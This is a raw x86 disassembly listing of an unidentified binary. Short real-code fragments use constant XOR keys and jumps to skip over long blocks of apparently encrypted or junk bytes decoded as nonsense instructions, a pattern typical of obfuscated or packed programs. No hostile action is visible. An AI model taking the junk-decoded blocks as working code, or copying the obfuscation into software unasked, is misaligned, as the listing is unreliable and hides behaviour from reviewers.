  40c3fb:	mov    eax,DWORD PTR [ebp-0x18]
  40c3fe:	xor    eax,ecx
  40c400:	add    eax,edx
  40c402:	mov    edx,DWORD PTR [ebp+0x14]
  40c405:	imul   eax,DWORD PTR [edx]
  40c408:	mov    edx,DWORD PTR [ebp-0x4]
  40c40b:	xor    edx,ecx
  40c40d:	mov    ecx,DWORD PTR [ebp+0x8]
  40c410:	lea    ecx,[edx+ecx*1+0x32729b]
  40c417:	cmp    ecx,eax
  40c419:	je     0x40cbb9
  40c41f:	mov    edi,DWORD PTR [ebp-0x18]
  40c422:	mov    eax,DWORD PTR [ebp+0x8]
  40c425:	mov    edx,DWORD PTR [ebp+0x14]
  40c428:	mov    eax,DWORD PTR [edx+eax*4+0x4]
  40c42c:	mov    ecx,0x7510854
  40c431:	xor    edx,edx
  40c433:	xor    edi,ecx
  40c435:	jmp    0x40c698
  40c43a:	dec    ebp
  40c43b:	scas   al,BYTE PTR es:[edi]
  40c43c:	push   ss
  40c43d:	pop    ebx
  40c43e:	cmc    
  40c43f:	arpl   WORD PTR [ecx-0x58],si
  40c442:	pop    esi
  40c443:	clc    
  40c444:	push   ss
  40c445:	rol    ebx,cl
  40c447:	pop    ds
  40c448:	push   edx
  40c449:	in     eax,dx
  40c44a:	adc    al,0x82
  40c44c:	jle    0x40c4cc
  40c44e:	cmp    BYTE PTR [esi+edi*2+0x7e],bh
  40c452:	xchg   esi,eax
  40c453:	adc    DWORD PTR [edi],0xa7ba3156
  40c459:	adc    BYTE PTR [edx-0x5aae6cfa],cl
  40c45f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c460:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c461:	ja     0x40c49e
  40c463:	adc    DWORD PTR ds:0x1956c28d,ebp
  40c469:	scas   al,BYTE PTR es:[edi]
  40c46a:	add    DWORD PTR [edx-0x606ae4b0],0x5abaddfc
  40c474:	jae    0x40c416
  40c476:	adc    eax,0xcdb3c508
  40c47b:	rcl    dh,0x6b
  40c47e:	xchg   ecx,eax
  40c47f:	mov    edx,edx
  40c481:	jmp    0x19043c32
  40c486:	push   esi
  40c487:	(bad)  
  40c488:	mov    DWORD PTR [ebx+eiz*8+0x45],0x898a6b51
  40c490:	jp     0x40c4cf
  40c492:	mov    DWORD PTR [ebx],0x985deb95
  40c498:	cmp    al,0x2c
  40c49a:	fiadd  WORD PTR [edi+0x64]
  40c49d:	inc    ebx
  40c49e:	mov    dl,0x94
  40c4a0:	pop    ebp
  40c4a1:	(bad)  
  40c4a2:	lock or DWORD PTR [esi],edx
  40c4a5:	and    BYTE PTR [edx],dh
  40c4a7:	fimul  DWORD PTR [ebx+edi*1-0x66]
  40c4ab:	ror    eax,0x87
  40c4ae:	mov    ah,BYTE PTR [edx+0x76]
  40c4b1:	pop    es
  40c4b2:	inc    esi
  40c4b3:	xor    edx,0xffffff87
  40c4b6:	ja     0x40c44a
  40c4b8:	cmp    edi,DWORD PTR [eax+0x6a]
  40c4bb:	dec    ebp
  40c4bc:	out    0x61,eax
  40c4be:	push   ds
  40c4bf:	lds    ebx,FWORD PTR [eax]
  40c4c1:	push   fs
  40c4c3:	add    DWORD PTR [eax+edx*2-0x1dbab824],0x929ac092
  40c4ce:	add    edx,DWORD PTR [ecx-0xd]
  40c4d1:	ja     0x40c54c
  40c4d3:	cs dec esp
  40c4d5:	inc    ebx
  40c4d6:	int3   
  40c4d7:	push   esp
  40c4d8:	int    0xfc
  40c4da:	mov    esi,0xb641d90d
  40c4df:	hlt    
  40c4e0:	dec    eax
  40c4e1:	call   0x78c2:0xf71c62bf
  40c4e8:	dec    esi
  40c4e9:	je     0x40c49d
  40c4eb:	mov    ss,WORD PTR [edx+0x7e]
  40c4ee:	pop    edi
  40c4ef:	cmp    DWORD PTR [ebx-0x12030bf4],ebp
  40c4f5:	addr16 js 0x40c506
  40c4f8:	cdq    
  40c4f9:	pop    ss
  40c4fa:	mov    esp,DWORD PTR [ebx+eax*2-0x63]
  40c4fe:	mov    ds:0xd0192b99,eax
  40c503:	cmp    al,0x3d
  40c505:	jle    0x40c55c
  40c507:	mov    esi,0x747120a6
  40c50c:	cmp    ebp,DWORD PTR [eax+edx*4]
  40c50f:	and    cl,BYTE PTR [edx-0x3d]
  40c512:	(bad)  
  40c513:	lods   al,BYTE PTR ds:[esi]
  40c514:	ds jb  0x40c58d
  40c517:	(bad)  
  40c518:	loope  0x40c599
  40c51a:	fild   QWORD PTR [esi-0x14]
  40c51d:	cs das 
  40c51f:	(bad)  
  40c520:	div    ah
  40c522:	jns    0x40c548
  40c524:	pushf  
  40c525:	lahf   
  40c526:	das    
  40c527:	outs   dx,DWORD PTR ds:[esi]
  40c528:	cld    
  40c529:	mov    eax,0x9805eb50
  40c52e:	lds    esi,FWORD PTR [ecx+edi*1]
  40c531:	mov    eax,ds:0xd62235da
  40c536:	rcr    BYTE PTR [esi+0x21cd063d],0x28
  40c53d:	xchg   esi,eax
  40c53e:	lds    ebp,FWORD PTR [edi]
  40c540:	(bad)  
  40c541:	or     eax,DWORD PTR [ecx+0x43]
  40c544:	pop    ebp
  40c545:	pop    ds
  40c546:	test   esi,esi
  40c548:	push   ss
  40c549:	dec    ecx
  40c54a:	or     DWORD PTR [ebp-0x7f],ebx
  40c54d:	gs xchg esp,eax
  40c54f:	fidivr DWORD PTR [ecx+0x6f]
  40c552:	mul    bl
  40c554:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c555:	mov    DWORD PTR [ecx+0x7a307993],esp
  40c55b:	lods   al,BYTE PTR ds:[esi]
  40c55c:	imul   ecx,DWORD PTR [edx],0xffffff9f
  40c55f:	mov    esi,DWORD PTR [ebx-0x42]
  40c562:	inc    ebp
  40c563:	mov    es,WORD PTR [ebx-0xcec8da1]
  40c569:	ja     0x40c5cc
  40c56b:	dec    ecx
  40c56c:	mov    dh,0xf8
  40c56e:	int    0x9b
  40c570:	and    bl,cl
  40c572:	popf   
  40c573:	sar    BYTE PTR [ebx+eiz*1],0x89
  40c577:	push   esi
  40c578:	and    eax,0xe58e0dac
  40c57d:	lea    eax,[edi+0x5f]
  40c580:	dec    esp
  40c581:	inc    ecx
  40c582:	out    0x7a,al
  40c584:	les    eax,FWORD PTR [ecx+0xe0594cb]
  40c58a:	shl    esi,1
  40c58c:	inc    esi
  40c58d:	push   es
  40c58e:	(bad)  
  40c58f:	rol    cl,1
  40c591:	adc    ecx,DWORD PTR [ebp-0x63]
  40c594:	sub    dl,BYTE PTR [ecx-0xc]
  40c597:	cmp    edx,0x30be369b
  40c59d:	jne    0x40c539
  40c59f:	jmp    0x40c55f
  40c5a1:	lock xor al,0x84
  40c5a4:	inc    ebx
  40c5a5:	push   0xffffffbd
  40c5a7:	jle    0x40c611
  40c5a9:	mov    ebx,0xed0ab640
  40c5ae:	ds (bad) 
  40c5b0:	jge    0x40c5e6
  40c5b2:	xor    dh,ah
  40c5b4:	xchg   esp,eax
  40c5b5:	inc    esi
  40c5b6:	icebp  
  40c5b7:	popa   
  40c5b8:	mov    ds:0x25e73ae7,eax
  40c5bd:	mov    esi,0x644166a5
  40c5c2:	ds mov ecx,0xb3d62d7
  40c5c8:	or     eax,0xda230969
  40c5cd:	sub    dl,0x5b
  40c5d0:	ficomp WORD PTR [ecx+0x4e]
  40c5d3:	lahf   
  40c5d4:	popf   
  40c5d5:	xor    BYTE PTR [ebx+0xa96e5d3],cl
  40c5db:	cmp    DWORD PTR ds:0xd735bb97,edi
  40c5e1:	jno    0x40c617
  40c5e3:	int3   
  40c5e4:	std    
  40c5e5:	sub    al,0x27
  40c5e7:	mov    bl,BYTE PTR [edi]
  40c5e9:	int3   
  40c5ea:	xor    DWORD PTR [eax],0x63754cb2
  40c5f0:	xchg   edx,eax
  40c5f1:	cmp    al,0xb7
  40c5f3:	loop   0x40c605
  40c5f5:	pop    ds
  40c5f6:	aam    0xc0
  40c5f8:	ss dec ecx
  40c5fa:	aaa    
  40c5fb:	call   0xc952:0x1233bb91
  40c602:	push   ebp
  40c603:	or     eax,0xda30dfc9
  40c608:	lock mov ah,0x86
  40c60b:	cmp    DWORD PTR [eax],esi
  40c60d:	bound  ebx,QWORD PTR [edx+0x70]
  40c610:	repz loopne 0x40c5b7
  40c613:	popf   
  40c614:	cld    
  40c615:	in     al,0x32
  40c617:	mov    bl,0x53
  40c619:	inc    edi
  40c61b:	push   es
  40c61c:	and    esp,DWORD PTR [eax+0x593046f5]
  40c622:	aaa    
  40c623:	xchg   DWORD PTR [esi-0x533dca0c],edx
  40c629:	in     al,dx
  40c62a:	push   ecx
  40c62b:	pop    ds
  40c62c:	aad    0x23
  40c62e:	imul   esi,eax,0x81434b9a
  40c634:	sbb    bl,ch
  40c636:	pop    ebx
  40c637:	sub    eax,0x476f7b82
  40c63c:	xor    BYTE PTR [edx-0x501bd8a6],cl
  40c642:	cmp    al,0x90
  40c644:	xor    esi,esp
  40c646:	outs   dx,DWORD PTR ds:[esi]
  40c647:	xor    ebp,DWORD PTR [ebx+0x2]
  40c64a:	repz pop ebx
  40c64c:	xor    ecx,esp
  40c64e:	dec    ecx
  40c64f:	stos   DWORD PTR es:[edi],eax
  40c650:	bound  edx,QWORD PTR [eax]
  40c652:	gs and dl,ah
  40c655:	jl     0x40c626
  40c657:	fisubr WORD PTR [eax+0x1dfb1777]
  40c65d:	imul   ebp,ecx,0x45
  40c660:	js     0x40c66e
  40c662:	stos   BYTE PTR es:[edi],al
  40c663:	cmp    edx,esp
  40c665:	add    esp,esi
  40c667:	mov    esp,0x7a1969cf
  40c66c:	repz and eax,0xe2750af
  40c672:	popf   
  40c673:	xor    DWORD PTR [eax],ebp
  40c675:	rcl    DWORD PTR [ebx],cl
  40c677:	lds    edi,FWORD PTR fs:[eax-0x7c26780d]
  40c67e:	lods   eax,DWORD PTR ds:[esi]
  40c67f:	out    0x10,al
  40c681:	jo     0x40c61e
  40c683:	pop    edi
  40c684:	ds out 0x1a,al
  40c687:	lock sub al,0xa
  40c68a:	dec    ebp
  40c68b:	or     eax,0x67a77ad4
  40c690:	fidiv  DWORD PTR [eax-0x5537fcb8]
  40c696:	lock retf 0x9bbe
  40c69a:	jb     0x40c6ce
  40c69c:	add    BYTE PTR [ebx],al
  40c69e:	(bad)  
  40c69f:	div    edi
  40c6a1:	mov    edx,DWORD PTR [ebp-0x4]
  40c6a4:	xor    edx,ecx
  40c6a6:	lea    eax,[edx+eax*1+0x32729b]
  40c6ad:	mov    edx,DWORD PTR [ebp+0x8]
  40c6b0:	mov    edi,DWORD PTR [ebp-0x24]
  40c6b3:	mov    DWORD PTR [edi+edx*4],eax
  40c6b6:	mov    eax,DWORD PTR [ebp-0x18]
  40c6b9:	mov    edx,DWORD PTR [ebp+0x8]
  40c6bc:	xor    eax,ecx
  40c6be:	lea    eax,[eax+edx*1+0x32729b]
  40c6c5:	mov    DWORD PTR [ebp+0x8],eax
  40c6c8:	mov    eax,DWORD PTR [ebp-0x18]
  40c6cb:	jmp    0x40c92e
  40c6d0:	leave  
  40c6d1:	adc    bl,ah
  40c6d3:	cmp    eax,0x10f1ede3
  40c6d8:	xor    BYTE PTR [ebp+0x2d419ac1],dl
  40c6de:	push   es
  40c6df:	outs   dx,BYTE PTR ds:[esi]
  40c6e0:	fiadd  WORD PTR [eax+0x7c387e7e]
  40c6e6:	jle    0x40c766
  40c6e8:	in     eax,dx
  40c6e9:	call   0xab34:0x93e31657
  40c6f0:	outs   dx,DWORD PTR ds:[esi]
  40c6f1:	jecxz  0x40c71d
  40c6f3:	jbe    0x40c768
  40c6f5:	xchg   esi,eax
  40c6f6:	ret    0x5a86
  40c6f9:	mov    ecx,0xf17db4a1
  40c6fe:	popa   
  40c6ff:	aaa    
  40c700:	cmc    
  40c701:	mov    esi,0xe910d1ce
  40c706:	hlt    
  40c707:	call   0x4192:0xf0548a65
  40c70e:	das    
  40c70f:	arpl   WORD PTR [ecx-0x4a51ecf0],ax
  40c715:	js     0x40c74e
  40c717:	push   ecx
  40c718:	into   
  40c719:	sar    DWORD PTR [esi],0x44
  40c71c:	jle    0x40c704
  40c71e:	xor    DWORD PTR [eax-0x73],eax
  40c721:	(bad)  
  40c723:	mov    esi,0x286b4568
  40c728:	xor    DWORD PTR [ebx],ecx
  40c72a:	sbb    al,0xa7
  40c72c:	repnz inc eax
  40c72e:	movhps xmm2,QWORD PTR [eax]
  40c731:	dec    ebp
  40c732:	test   BYTE PTR [ebx-0x6c],al
  40c735:	pop    ds
  40c736:	shr    BYTE PTR [ecx-0x26844283],1
  40c73c:	or     al,dl
  40c73e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c73f:	and    edx,DWORD PTR [edi-0x42]
  40c742:	hlt    
  40c743:	mov    BYTE PTR [ecx+0x28],dl
  40c746:	pop    eax
  40c747:	stos   DWORD PTR es:[edi],eax
  40c748:	mov    ecx,0xa0f22b53
  40c74d:	lahf   
  40c74e:	ja     0x40c6f5
  40c750:	sbb    al,0x72
  40c752:	xchg   edx,eax
  40c753:	and    eax,DWORD PTR [edi+0x5f]
  40c756:	pop    ebx
  40c757:	fidivr WORD PTR [ecx+edi*4]
  40c75a:	cli    
  40c75b:	ins    BYTE PTR es:[edi],dx
  40c75c:	add    DWORD PTR [edi-0x1f4cd596],0xc5d52f27
  40c766:	(bad)  
  40c767:	ror    BYTE PTR [ebx-0x43],1
  40c76a:	das    
  40c76b:	and    ecx,0x57
  40c76e:	adc    DWORD PTR [esi],0x5a
  40c771:	jns    0x40c7c7
  40c773:	test   BYTE PTR [ebp-0x14f6ab96],0x11
  40c77a:	adc    esi,DWORD PTR [ecx+0x1744f894]
  40c780:	jecxz  0x40c7e4
  40c782:	mov    eax,DWORD PTR [eax+esi*8-0x2f8910d9]
  40c789:	jg     0x40c780
  40c78b:	call   0xacea:0x72c781fd
  40c792:	mov    dl,al
  40c794:	hlt    
  40c795:	or     dh,bh
  40c797:	outs   dx,DWORD PTR ds:[esi]
  40c798:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c799:	or     DWORD PTR [esi+0x71],0xd78da64b
  40c7a0:	std    
  40c7a1:	xchg   edi,eax
  40c7a2:	pop    eax
  40c7a3:	mov    al,ds:0x624f2f16
  40c7a8:	imul   ebx,DWORD PTR [edi+0x66],0xb7f34da8
  40c7af:	test   al,0xea
  40c7b1:	retf   
  40c7b2:	push   esp
  40c7b3:	adc    BYTE PTR [ebp-0x10],bl
  40c7b6:	jno    0x40c778
  40c7b8:	cmovl  ecx,DWORD PTR [eax]
  40c7bb:	xchg   eax,ecx
  40c7bd:	push   eax
  40c7be:	in     al,dx
  40c7bf:	pop    ecx
  40c7c0:	stc    
  40c7c1:	and    eax,DWORD PTR [edx]
  40c7c3:	push   0x11
  40c7c5:	sub    DWORD PTR [ecx+0x39],0xffffffc0
  40c7c9:	jl     0x40c75b
  40c7cb:	ins    DWORD PTR es:[edi],dx
  40c7cc:	popa   
  40c7cd:	rcr    edi,0x11
  40c7d0:	push   es
  40c7d1:	loop   0x40c80e
  40c7d3:	inc    eax
  40c7d4:	cmp    DWORD PTR [esi+0x28a4ead],0xffffff96
  40c7db:	popf   
  40c7dc:	cdq    
  40c7dd:	cmp    dl,BYTE PTR [edx]
  40c7df:	fnstcw WORD PTR [ecx-0x4cd0af03]
  40c7e5:	mov    dl,BYTE PTR [ecx+0x6ae134e1]
  40c7eb:	data16 mov bl,0x91
  40c7ee:	sbb    BYTE PTR [edi+0x188cad7f],0xde
  40c7f5:	adc    eax,0xe753879f
  40c7fa:	mov    edi,0x4f056483
  40c7ff:	cmc    
  40c800:	jmp    0x40c807
  40c802:	xor    dl,BYTE PTR [eax+0x2b]
  40c805:	mov    eax,DWORD PTR [esi+eax*2]
  40c808:	sbb    al,0x3c
  40c80a:	dec    ecx
  40c80b:	out    dx,al
  40c80c:	fidivr WORD PTR fs:[esi]
  40c80f:	les    eax,FWORD PTR [ecx+0x523f8fa0]
  40c815:	mov    al,ds:0xa04b1136
  40c81a:	adc    cl,BYTE PTR [eax+0x3f]
  40c81d:	mov    ecx,0xabfeb080
  40c822:	xchg   BYTE PTR cs:[eax+0x41],dh
  40c826:	mov    al,0x5
  40c828:	dec    edx
  40c829:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c82a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c82b:	pop    ds
  40c82c:	cmp    al,BYTE PTR [edx+0x74]
  40c82f:	call   0x7840:0x1f66275
  40c836:	rol    BYTE PTR [eax],0xf3
  40c839:	pop    ss
  40c83a:	sar    DWORD PTR [edi],0x88
  40c83d:	cmp    BYTE PTR [edx],cl
  40c83f:	add    DWORD PTR [ecx],ebx
  40c841:	je     0x40c87a
  40c843:	popf   
  40c844:	sbb    al,0xc7
  40c846:	and    al,0xfd
  40c848:	push   esp
  40c849:	jbe    0x40c7f5
  40c84b:	lea    ebx,[ebx]
  40c84d:	xchg   BYTE PTR [edi-0x11],ch
  40c850:	mov    al,0xa5
  40c852:	add    bl,BYTE PTR ds:0xd6d11f8d
  40c858:	jmp    0xbba3d5c
  40c85d:	stc    
  40c85e:	fmul   st(6),st
  40c860:	ins    DWORD PTR es:[edi],dx
  40c861:	xor    eax,DWORD PTR ds:0x778434af
  40c867:	aad    0x5e
  40c869:	inc    ebx
  40c86a:	stos   DWORD PTR es:[edi],eax
  40c86b:	xchg   esi,eax
  40c86c:	not    BYTE PTR [esi+esi*2]
  40c86f:	loop   0x40c8d2
  40c871:	inc    ecx
  40c872:	jmp    0x9463792d
  40c877:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c878:	scas   eax,DWORD PTR es:[edi]
  40c879:	repz cmp DWORD PTR [ebp-0x1190ab45],ecx
  40c880:	adc    ebx,DWORD PTR [esi+ebx*8+0x91b8a3]
  40c887:	rcr    BYTE PTR [esi-0x1b4032b8],1
  40c88d:	in     eax,dx
  40c88e:	sbb    eax,0x3c36b66b
  40c893:	fs jne 0x40c8ab
  40c896:	mov    ebp,0x3e219601
  40c89b:	retf   
  40c89c:	sub    al,0x4d
  40c89e:	leave  
  40c89f:	mov    dl,0x77
  40c8a1:	push   esi
  40c8a2:	cmp    al,0x94
  40c8a4:	dec    ecx
  40c8a5:	pop    ss
  40c8a6:	dec    edx
  40c8a7:	jmp    0x904a:0xa332ce3a
  40c8ae:	(bad)  
  40c8af:	shl    BYTE PTR [esi+0x6a90e9ca],cl
  40c8b5:	js     0x40c86e
  40c8b7:	neg    BYTE PTR ds:0x8d2128bb
  40c8bd:	ins    BYTE PTR es:[edi],dx
  40c8be:	or     DWORD PTR [ebx],edi
  40c8c0:	fmul   st(3),st
  40c8c2:	push   0xffffffe6
  40c8c4:	pop    ds
  40c8c5:	in     eax,0x68
  40c8c7:	fisttp DWORD PTR [eax+0x56ad6371]
  40c8cd:	pushf  
  40c8ce:	es call 0xb0a08408
  40c8d4:	inc    ebx
  40c8d5:	xlat   BYTE PTR ds:[ebx]
  40c8d6:	push   ecx
  40c8d7:	or     BYTE PTR [ecx+0x3c],ah
  40c8da:	pop    esi
  40c8db:	and    bl,0xa0
  40c8de:	xor    DWORD PTR [ebx-0x5b],esp
  40c8e1:	push   esi
  40c8e2:	push   0xe
  40c8e4:	jp     0x40c905
  40c8e6:	call   0x7b18:0xc3cc27b7
  40c8ed:	sbb    DWORD PTR [eax],esi
  40c8ef:	jb     0x40c8ac
  40c8f1:	adc    al,bl
  40c8f3:	(bad)  
  40c8f4:	rcl    DWORD PTR [esi],0x5
  40c8f7:	mov    eax,ds:0x8ebb3445
  40c8fc:	(bad)  
  40c8fd:	sub    BYTE PTR [ebx-0x55f6720],al
  40c903:	test   DWORD PTR [eax+0x48b9c20b],0xfa693a2f
  40c90d:	mov    esi,0x6ca8e10f
  40c912:	jge    0x40c90f
  40c914:	pop    eax
  40c915:	icebp  
  40c916:	lea    edx,[ebx-0x1d]
  40c919:	and    eax,0xb0e3a487
  40c91e:	xor    al,0xe7
  40c920:	ror    BYTE PTR [ebp+0x3d402656],1
  40c926:	inc    esp
  40c927:	add    DWORD PTR [eax-0x8],ebp
  40c92a:	rcl    DWORD PTR [edi-0x4c],0xeb
  40c92e:	mov    edx,DWORD PTR [ebp+0x14]
  40c931:	xor    eax,ecx
  40c933:	jmp    0x40cb96
  40c938:	pop    es
  40c939:	mov    ah,0x6
  40c93b:	cwde   
  40c93c:	mov    ch,0xa8
  40c93e:	mov    eax,ds:0x31ca67b1
  40c943:	cmp    DWORD PTR [ebp-0x676161c3],edi
  40c949:	mov    ?,WORD PTR [esi+0x7e]
  40c94c:	cmp    BYTE PTR [esi+edi*2+0x7e],bh
  40c950:	nop
  40c951:	out    dx,al
  40c952:	and    eax,0x22e6feed
  40c957:	xor    DWORD PTR [edx+0x50920457],edi
  40c95d:	xchg   BYTE PTR [ecx+edi*2-0xe3fed05],bl
  40c964:	jbe    0x40c93b
  40c966:	int3   
  40c967:	jg     0x40c91b
  40c969:	xchg   edi,eax
  40c96a:	out    0x3d,eax
  40c96c:	loop   0x40c9eb
  40c96e:	mov    bh,0x25
  40c970:	jne    0x40c9bf
  40c972:	sbb    eax,ebx
  40c974:	push   esi
  40c976:	push   es
  40c977:	push   ds
  40c978:	push   es
  40c979:	add    dl,bl
  40c97b:	fcomip st,st(1)
  40c97d:	jle    0x40c9fd
  40c97f:	xchg   DWORD PTR [edi-0x59],ecx
  40c982:	into   
  40c983:	test   DWORD PTR [ebx-0x113ea1f3],ecx
  40c989:	dec    esp
  40c98a:	add    BYTE PTR es:[edi-0x7d],al
  40c98e:	push   ebx
  40c98f:	or     al,0x29
  40c991:	shl    BYTE PTR [ebx-0x6161e14d],1
  40c997:	lock or BYTE PTR [ebx+0x369d645b],0x29
  40c99f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c9a0:	shld   DWORD PTR [ebx-0x64],edx,cl
  40c9a4:	fdivr  QWORD PTR [ebp+ecx*1-0x6bb39ede]
  40c9ab:	mov    eax,ds:0x28e508b7
  40c9b0:	bound  esp,QWORD PTR [eax-0x55]
  40c9b3:	rol    BYTE PTR [eax-0x3fadb14e],cl
  40c9b9:	cmp    DWORD PTR [ebx-0x30],esp
  40c9bc:	inc    ecx
  40c9bd:	lds    ecx,FWORD PTR [ebp-0x4eb91fb2]
  40c9c3:	xchg   ebp,eax
  40c9c4:	popf   
  40c9c5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c9c6:	call   0xcd9f:0xad37f03b
  40c9cd:	and    bl,cl
  40c9cf:	dec    ebp
  40c9d0:	pop    esi
  40c9d1:	adc    al,0x32
  40c9d3:	cmp    al,0xb7
  40c9d5:	cdq    
  40c9d6:	sbb    esi,0x64
  40c9d9:	adc    eax,0xc62c18a6
  40c9de:	push   sp
  40c9e0:	(bad)
  40c9e3:	jmp    0x3ad1:0x76b50b6f
  40c9ea:	xchg   ecx,eax
  40c9eb:	cmp    dl,al
  40c9ed:	xlat   BYTE PTR ds:[ebx]
  40c9ee:	jle    0x40ca59
  40c9f0:	data16 std 
  40c9f2:	jge    0x40ca3c
  40c9f4:	ins    BYTE PTR es:[edi],dx
  40c9f5:	jae    0x40ca4f
  40c9f7:	(bad)  
  40c9f9:	dec    ecx
  40c9fb:	add    al,0x48
  40c9fd:	jb     0x40c9de
  40c9ff:	push   cs
  40ca00:	cmp    DWORD PTR [ebx+0x2cc89ccd],edi
  40ca06:	or     al,0x16
  40ca08:	cmp    DWORD PTR [ecx+0x6f],0xb502fda
  40ca0f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ca10:	enter  0x11e8,0xfa
  40ca14:	data16 xor BYTE PTR [ecx+0x7],ch
  40ca18:	or     BYTE PTR [ecx+0xe],dh
  40ca1b:	test   BYTE PTR [ebp+0x4aec0a4a],dl
  40ca21:	sbb    al,0x35
  40ca23:	pop    esp
  40ca24:	jp     0x40ca2d
  40ca26:	ja     0x40ca2b
  40ca28:	mov    WORD PTR [ebp-0x5085f8b7],ds
  40ca2e:	aaa    
  40ca2f:	iret   
  40ca30:	and    bl,0x2c
  40ca33:	xchg   esi,eax
  40ca34:	lods   al,BYTE PTR ds:[esi]
  40ca35:	icebp  
  40ca36:	rcl    DWORD PTR [ebx+esi*2],cl
  40ca39:	sbb    bl,BYTE PTR ss:[eax+0x5e]
  40ca3d:	adc    ebp,DWORD PTR [eax+0x23dbb9b0]
  40ca43:	mov    ds:0xc0985a37,eax
  40ca48:	jo     0x40caaf
  40ca4a:	test   al,0x2d
  40ca4c:	cmp    DWORD PTR [esi+eiz*8+0x34],0x13609aeb
  40ca54:	sub    edi,ebp
  40ca56:	ret    0x1969
  40ca59:	mov    dl,0x4a
  40ca5b:	and    dh,cl
  40ca5d:	mov    ds:0xbd73f547,al
  40ca62:	mov    ecx,0x84d00738
  40ca67:	jae    0x40c9f5
  40ca69:	fimul  DWORD PTR fs:[ecx+ebp*4-0x28266931]
  40ca71:	mov    ebx,0x66655a9
  40ca76:	add    eax,0xf4033303
  40ca7b:	inc    esi
  40ca7c:	or     ecx,edi
  40ca7e:	enter  0x34fa,0x8c
  40ca82:	sbb    esi,esi
  40ca84:	fisttp QWORD PTR [eax-0x5b]
  40ca87:	jns    0x40ca17
  40ca89:	scas   al,BYTE PTR es:[edi]
  40ca8a:	cmp    eax,0x6b2bc84f
  40ca8f:	outs   dx,DWORD PTR ds:[esi]
  40ca90:	cld    
  40ca91:	sub    al,BYTE PTR [eax]
  40ca93:	retf   
  40ca94:	adc    eax,0x2688328f
  40ca99:	jg     0x40cb07
  40ca9b:	adc    esi,esp
  40ca9d:	in     eax,0x71
  40ca9f:	push   edi
  40caa0:	imul   esi,edi,0x4a38fee1
  40caa6:	cli    
  40caa7:	gs sub al,0x36
  40caaa:	cwde   
  40caab:	push   ebp
  40caac:	mov    dl,0xe5
  40caae:	dec    eax
  40caaf:	dec    edi
  40cab0:	adc    al,0xf0
  40cab2:	outs   dx,DWORD PTR ds:[esi]
  40cab3:	pop    es
  40cab4:	jb     0x40ca64
  40cab6:	int    0xbb
  40cab8:	fimul  WORD PTR [eax]
  40caba:	ret    
  40cabb:	gs into 
  40cabd:	dec    edi
  40cabe:	and    dl,BYTE PTR [eax+0x1bd62f65]
  40cac4:	loope  0x40ca62
  40cac6:	in     eax,0xca
  40cac8:	call   FWORD PTR [edx]
  40caca:	inc    ebx
  40cacb:	leave  
  40cacc:	mov    ds:0xd18775f3,eax
  40cad1:	test   BYTE PTR ds:0xc07da647,al
  40cad7:	xor    BYTE PTR [ebx+0x4e94ae05],0x47
  40cade:	push   edx
  40cadf:	mov    ebp,0x446742cc
  40cae4:	xchg   esi,eax
  40cae5:	into   
  40cae6:	add    esp,DWORD PTR [esi+0x7c]
  40cae9:	fsubrp st(1),st
  40caeb:	jb     0x40cb5b
  40caed:	stos   DWORD PTR es:[edi],eax
  40caee:	jmp    0x2c58:0x838e88f1
  40caf5:	aas    
  40caf6:	lds    ebx,FWORD PTR [ebp-0x3afd0cd6]
  40cafc:	out    0x7d,al
  40cafe:	loope  0x40cb49
  40cb00:	or     ch,BYTE PTR [ebp-0x6a4b3e6a]
  40cb06:	ja     0x40cac1
  40cb08:	jge    0x40cb5f
  40cb0a:	push   ss
  40cb0b:	ins    DWORD PTR es:[edi],dx
  40cb0c:	jl     0x40cb12
  40cb0e:	dec    esi
  40cb0f:	ret    0x373d
  40cb12:	dec    ebp
  40cb13:	(bad)  
  40cb14:	jecxz  0x40caf4
  40cb16:	cld    
  40cb17:	inc    ebx
  40cb18:	shl    DWORD PTR [eax-0x46],1
  40cb1b:	sub    ebp,DWORD PTR [ebp-0x1a]
  40cb1e:	inc    esi
  40cb1f:	sbb    esi,DWORD PTR [ebx]
  40cb21:	pop    ds
  40cb22:	push   es
  40cb23:	mov    ch,0x5a
  40cb25:	clc    
  40cb26:	outs   dx,BYTE PTR ds:[esi]
  40cb27:	and    dl,BYTE PTR [eax+ebx*1-0x299127fa]
  40cb2e:	xor    dl,BYTE PTR [ebx-0x637218bb]
  40cb34:	popf   
  40cb35:	call   0xb9ba2ac9
  40cb3a:	pop    es
  40cb3b:	ret    0xb998
  40cb3e:	and    al,0xb7
  40cb40:	stos   BYTE PTR es:[edi],al
  40cb41:	mov    edi,0x4155193
  40cb46:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cb47:	(bad)  
  40cb48:	mov    cl,0x18
  40cb4a:	and    dl,al
  40cb4c:	jl     0x40cb10
  40cb4e:	mov    al,ds:0xc7104f63
  40cb53:	pusha  
  40cb54:	loope  0x40cb35
  40cb56:	push   0xeb6f8f40
  40cb5b:	xor    al,0x9d
  40cb5d:	pop    ecx
  40cb5e:	out    0xac,eax
  40cb60:	push   ds
  40cb61:	mov    WORD PTR [ebx],?
  40cb63:	loopne 0x40cb24
  40cb65:	shl    DWORD PTR [edx+eax*2-0x4e],cl
  40cb69:	sub    ch,cl
  40cb6b:	sub    DWORD PTR [edx],edi
  40cb6d:	aad    0x25
  40cb6f:	sub    al,0xfb
  40cb71:	pop    esp
  40cb72:	cmp    eax,DWORD PTR [ebx]
  40cb74:	xchg   ebp,eax
  40cb75:	ss ins DWORD PTR es:[edi],dx
  40cb77:	inc    esp
  40cb78:	fisub  WORD PTR [edx+0x353c3996]
  40cb7e:	(bad)  
  40cb7f:	pop    esp
  40cb80:	push   ecx
  40cb81:	and    DWORD PTR [ecx-0x7b2077f4],ebp
  40cb87:	push   eax
  40cb88:	gs inc eax
  40cb8a:	dec    ecx
  40cb8b:	adc    al,0x9e
  40cb8d:	jl     0x40cc01
  40cb8f:	and    edx,DWORD PTR [edx]
